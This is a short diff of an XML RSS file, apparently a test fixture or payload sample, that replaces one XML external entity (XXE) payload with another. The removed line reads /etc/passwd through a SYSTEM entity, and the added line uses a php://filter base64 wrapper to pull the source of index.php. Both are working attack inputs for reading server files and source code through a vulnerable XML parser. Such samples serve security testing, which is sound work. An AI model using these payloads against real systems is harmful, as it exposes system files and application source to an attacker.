@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [
-  <!ENTITY include SYSTEM "file:///etc/passwd">
+  <!ENTITY replace SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
 ]>
 <rss version="2.0">
   <channel>
